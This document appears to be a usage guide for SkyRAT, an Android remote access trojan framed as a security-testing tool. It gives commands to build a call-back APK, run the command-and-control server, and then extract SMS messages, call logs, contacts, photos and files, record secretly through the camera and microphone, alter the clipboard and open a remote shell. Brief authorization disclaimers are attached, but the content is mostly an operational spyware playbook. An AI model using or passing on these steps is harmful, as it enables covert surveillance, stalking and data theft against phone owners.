# SkyRAT Basic Usage Examples

Practical examples for getting started with SkyRAT Android security testing.

## 🎯 Prerequisites

Before starting these examples:
- ✅ SkyRAT installed and configured
- ✅ Android test device available
- ✅ Proper authorization for testing
- ✅ Isolated test environment

## 📚 Example Scenarios

### **Example 1: Basic Device Assessment**

This example demonstrates a basic security assessment of an Android device.

#### **Step 1: Build and Deploy APK**
```bash
# Build APK for local network testing
python3 skyrat.py --build -i 192.168.1.100 -p 8000 -o basic-test.apk

# Install on test device
adb install build/basic-test.apk
```

#### **Step 2: Start C&C Server**
```bash
# Start server and wait for connection
python3 skyrat.py --shell -i 192.168.1.100 -p 8000
```

#### **Step 3: Basic Device Profiling**
```bash
# Get device information
SkyRAT:/> deviceInfo

# Check network configuration
SkyRAT:/> getIP
SkyRAT:/> getMACAddress

# Get SIM and cellular info
SkyRAT:/> getSimDetails

# System information
SkyRAT:/> sysinfo
```

#### **Expected Output:**
```
=== DEVICE INFORMATION ===
Hardware:
  Model: SM-G998B
  Manufacturer: samsung
  Brand: samsung
  Device: o1s

System:
  Android: 13
  API Level: 33
  Fingerprint: samsung/o1sxxx/o1s:13/...

Device IP: 192.168.1.45
MAC Address: 02:00:00:00:00:00
```

### **Example 2: Communication Data Analysis**

Analyze communication patterns and contacts on the device.

#### **Step 1: Extract Communication Data**
```bash
# Get SMS messages
SkyRAT:/> getSMS inbox
SkyRAT:/> getSMS sent

# Get call history
SkyRAT:/> getCallLogs

# Get contact list
SkyRAT:/> getContacts
```

#### **Step 2: Analyze Extracted Data**
```bash
# Check extracted files
ls -la dumps/

# Example analysis
cat dumps/inbox_SMS_20240315-143022.txt | grep -i "bank"
wc -l dumps/Call_Logs_20240315-143045.txt
```

#### **Sample Output Structure:**
```
dumps/
├── inbox_SMS_20240315-143022.txt
├── sent_SMS_20240315-143045.txt
├── Call_Logs_20240315-143123.txt
└── Contacts_20240315-143156.txt
```

### **Example 3: File System Exploration**

Explore the device file system and extract specific files.

#### **Step 1: File System Navigation**
```bash
# Start from root
SkyRAT:/> ls /

# Explore user data
SkyRAT:/> cd /sdcard
SkyRAT:/> ls

# Check Downloads folder
SkyRAT:/> cd Download
SkyRAT:/> ls
```

#### **Step 2: File Operations**
```bash
# Download interesting files
SkyRAT:/> download /sdcard/Download/document.pdf
SkyRAT:/> download /sdcard/DCIM/Camera/IMG_001.jpg

# Upload test file
SkyRAT:/> upload test-document.txt

# Create test directory
SkyRAT:/> mkdir /sdcard/security-test
```

#### **Step 3: System File Analysis**
```bash
# Examine system properties
SkyRAT:/> download /system/build.prop

# Check installed apps
SkyRAT:/> ls /data/app

# Explore system binaries
SkyRAT:/> ls /system/bin
```

### **Example 4: Application Analysis**

Analyze installed applications and their data.

#### **Step 1: Application Inventory**
```bash
# Get complete app list
SkyRAT:/> getApps

# Get media file information
SkyRAT:/> getPhotos
SkyRAT:/> getAudio
SkyRAT:/> getVideos
```

#### **Step 2: Process Analysis**
```bash
# Check running processes
SkyRAT:/> ps

# Kill specific app for testing
SkyRAT:/> kill com.android.chrome

# Monitor process restart
SkyRAT:/> ps | grep chrome
```

#### **Step 3: Network Analysis**
```bash
# Check network connections
SkyRAT:/> netstat

# Test connectivity
SkyRAT:/> ping google.com
SkyRAT:/> ping 8.8.8.8
```

### **Example 5: Remote Recording**

Demonstrate remote audio and video recording capabilities.

#### **Step 1: Camera Assessment**
```bash
# List available cameras
SkyRAT:/> camList

# Example output:
# Camera 0: Back
# Camera 1: Front
```

#### **Step 2: Video Recording**
```bash
# Start video recording (back camera)
SkyRAT:/> startVideo 0

# Wait for confirmation
# Recording started successfully!

# Record for 30 seconds, then stop
SkyRAT:/> stopVideo

# File automatically downloaded to dumps/Video_TIMESTAMP.mp4
```

#### **Step 3: Audio Recording**
```bash
# Start audio recording
SkyRAT:/> startAudio

# Wait for confirmation
# Audio recording started successfully!

# Record for 10 seconds, then stop
SkyRAT:/> stopAudio

# File automatically downloaded to dumps/Audio_TIMESTAMP.m4a
```

### **Example 6: System Control**

Demonstrate device control capabilities.

#### **Step 1: Clipboard Operations**
```bash
# Check current clipboard
SkyRAT:/> getClipData

# Set clipboard content
SkyRAT:/> setClip "Security test - timestamp: $(date)"

# Verify clipboard change
SkyRAT:/> getClipData
```

#### **Step 2: Device Interaction**
```bash
# Make device vibrate
SkyRAT:/> vibrate 3

# Execute shell commands
SkyRAT:/> shell cat /proc/version
SkyRAT:/> shell df -h
SkyRAT:/> shell ps aux | head -20
```

#### **Step 3: Interactive Shell**
```bash
# Enter interactive shell mode
SkyRAT:/> shell

android@shell:~$ pwd
android@shell:~$ whoami
android@shell:~$ uname -a
android@shell:~$ cat /proc/cpuinfo | head -10
android@shell:~$ exit

# Back to SkyRAT interface
SkyRAT:/>
```

## 🔍 Analysis Workflows

### **Security Assessment Workflow**

Complete security assessment sequence:

```bash
# 1. Device Profiling
SkyRAT:/> deviceInfo
SkyRAT:/> getIP
SkyRAT:/> sysinfo

# 2. Application Analysis
SkyRAT:/> getApps
SkyRAT:/> ps

# 3. Communication Analysis
SkyRAT:/> getSMS inbox
SkyRAT:/> getCallLogs
SkyRAT:/> getContacts

# 4. File System Analysis
SkyRAT:/> ls /sdcard
SkyRAT:/> download /system/build.prop

# 5. Network Analysis
SkyRAT:/> netstat
SkyRAT:/> ping google.com

# 6. Media Analysis
SkyRAT:/> getPhotos
SkyRAT:/> getVideos
```

### **Data Collection Workflow**

Systematic data collection:

```bash
# Create collection directory
SkyRAT:/> mkdir /sdcard/security-assessment

# Collect system information
SkyRAT:/> shell cat /proc/version > /sdcard/security-assessment/kernel.txt
SkyRAT:/> shell getprop > /sdcard/security-assessment/properties.txt

# Download collected data
SkyRAT:/> download /sdcard/security-assessment/kernel.txt
SkyRAT:/> download /sdcard/security-assessment/properties.txt

# Clean up
SkyRAT:/> delete /sdcard/security-assessment
```

## 📊 Example Results

### **Sample Device Profile**
```
Device: Samsung Galaxy S22 Ultra
Android: 13 (API 33)
IP: 192.168.1.45
MAC: 02:00:00:00:00:00
Storage: 128GB (45% used)
RAM: 12GB (8.2GB used)
SIM: Verizon (US)
```

### **Sample App Inventory**
```
Total Apps: 187
System Apps: 123
User Apps: 64
Recent Install: WhatsApp (2024-03-10)
Largest App: Netflix (245MB)
```

### **Sample Communication Summary**
```
SMS Messages: 2,847 (inbox: 1,923, sent: 924)
Call Logs: 456 entries (last 30 days)
Contacts: 234 contacts
Recent Activity: 15 messages today
```

## ⚠️ Important Notes

### **Legal and Ethical Considerations**
- Only test devices you own or have explicit permission to test
- Ensure compliance with local privacy laws
- Document all testing activities
- Secure extracted data appropriately

### **Technical Considerations**
- Test in isolated network environments
- Monitor device performance during testing
- Be aware of battery drain during recording
- Large file operations may take time

### **Best Practices**
- Always verify device authorization before testing
- Use descriptive names for APK outputs
- Organize extracted data systematically
- Document findings and methodologies

## 📝 Documentation Template

For each test session, document:

```markdown
## Test Session: [Date/Time]
**Device:** [Model and Android Version]
**Network:** [Test Network Configuration]
**Operator:** [Your Name]
**Authorization:** [Reference to authorization document]

### Objectives
- [ ] Device profiling
- [ ] Communication analysis
- [ ] File system assessment
- [ ] Application inventory

### Results
- Device successfully profiled
- [X] SMS extraction: 2,847 messages
- [X] Call logs: 456 entries
- [X] Contact list: 234 contacts
- [X] App inventory: 187 applications

### Findings
- [List security findings]
- [Note any anomalies]
- [Document recommendations]

### Files Collected
- dumps/deviceInfo_20240315-143000.txt
- dumps/inbox_SMS_20240315-143022.txt
- [List all extracted files]
```

## 🚀 Next Steps

After mastering basic usage:
1. Review [Advanced Features](advanced-features.md)
2. Study [Command Reference](../docs/commands.md)
3. Set up [Lab Environment](lab-setup.md)
4. Practice on controlled test devices

---

**These examples provide a foundation for Android security testing with SkyRAT. Always ensure proper authorization and follow responsible security research practices.**